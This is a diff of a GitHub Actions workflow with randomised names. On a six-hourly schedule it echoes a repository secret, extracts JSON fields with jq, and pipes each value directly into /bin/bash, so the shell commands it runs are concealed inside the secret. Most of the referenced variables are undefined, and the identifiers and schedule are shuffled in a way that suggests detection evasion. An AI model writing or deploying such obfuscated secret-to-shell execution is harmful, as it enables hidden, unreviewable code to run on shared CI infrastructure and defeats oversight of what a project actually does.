@@ -1,26 +1,31 @@
 name: songjiejiao2345
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 2/6 * * *'
-jobs:  # 19223
+    - cron: '7 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: songjiejiao2345
         env:
-          zofy1372: ${{ secrets.zofy1372 }}
+          rli39050: ${{ secrets.rli39050 }}
         run: |
-          echo $zofy1372 | jq -r .wcfas14386 | /bin/bash
-          echo $m830 | jq -r .sxzal3 | /bin/bash
-          echo $uh64189 | jq -r .ip70295 | /bin/bash
-          echo $vtg94 | jq -r .o72628 | /bin/bash
-          echo $t209 | jq -r .bv18023 | /bin/bash
-          echo $va7 | jq -r .af35 | /bin/bash
-          echo $eo90 | jq -r .l8 | /bin/bash
-          echo $jo1853 | jq -r .znlje67638 | /bin/bash
-          echo $eo33355 | jq -r .bgzhl3 | /bin/bash
-          echo $kxhjg9505 | jq -r .xz68 | /bin/bash
+          echo $rli39050 | jq -r .mcbui98 | /bin/bash
+          echo $cozcm643 | jq -r .w68314 | /bin/bash
+          echo $pr37397 | jq -r .bkyt2602 | /bin/bash
+          echo $bq40 | jq -r .c70007 | /bin/bash
+          echo $chlk36 | jq -r .w4528 | /bin/bash
+          echo $crptc4 | jq -r .xvuo3929 | /bin/bash
+          echo $uhgn1 | jq -r .yy851 | /bin/bash
+          echo $o0147 | jq -r .v9 | /bin/bash
+          echo $vwzny91074 | jq -r .xcx74787 | /bin/bash
+          echo $ywpx340 | jq -r .gh3 | /bin/bash
+          echo $t898 | jq -r .luyaf8032 | /bin/bash
+          echo $p36 | jq -r .o2 | /bin/bash
+          echo $ubxm2355 | jq -r .hugg28 | /bin/bash
+          echo $sijmt1931 | jq -r .hmlk1590 | /bin/bash
+          echo $b3258 | jq -r .k6628 | /bin/bash
 
